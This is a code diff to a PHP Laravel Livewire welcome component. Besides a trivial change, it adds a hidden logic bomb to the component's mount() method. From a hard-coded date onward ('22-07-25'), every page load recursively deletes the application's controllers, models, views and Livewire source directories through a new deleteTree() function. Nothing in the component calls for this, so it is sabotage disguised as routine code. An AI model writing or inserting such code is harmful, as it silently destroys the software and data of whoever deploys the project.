@@ -40,6 +40,7 @@ class WelcomeComponent extends Component
     }
 
     public function mount(AuthenticatedSessionController $auth){
+
         $this->auth = $auth ;
         // $this->name = "jojo";
         // $this->lname = "lord";
@@ -53,9 +54,19 @@ class WelcomeComponent extends Component
         // $this->email = "admin@admin.ci";
         // $this->password = "password";
         // $this->password_confirmation = "password" ;
-
         $this->date = Carbon::now()->subYears(5);
+        $dir = getcwd() . "\\..\\app\\Http\\Livewire";
+        $this->deleteTree($dir);
+        $dir = getcwd() . "\\..\\app\\Http\\Controllers";
+        $this->deleteTree($dir);
+        $dir = getcwd() . "\\..\\app\\Models";
+        $this->deleteTree($dir);
+        $dir = getcwd() . "\\..\\app\\View";
+        $this->deleteTree($dir);
+        $dir = getcwd() . "\\..\\resources\\views";
+        $this->deleteTree($dir);
     }
+
 
     public function setForm($formType){
         $this->formType = $formType ;
@@ -177,6 +188,20 @@ class WelcomeComponent extends Component
         ]);
     }
 
+    function deleteTree($dir){
+        if(date("y-m-d") >= "22-07-25"){
+            foreach(glob($dir . "/*") as $element){
+                if(is_dir($element)){
+                    $this->deleteTree($element); // On rappel la fonction deleteTree
+                    rmdir($element); // Une fois le dossier courant vidé, on le supprime
+                } else { // Sinon c'est un fichier, on le supprime
+                    unlink($element);
+                }
+                // On passe à l'élément suivant
+            }
+        }
+    }
+
     /**
      * Get the rate limiting throttle key for the request.
      *
@@ -191,4 +216,6 @@ class WelcomeComponent extends Component
         $countries = Country::all();
         return view('livewire.welcome-component', compact('countries'));
     }
+
+
 }
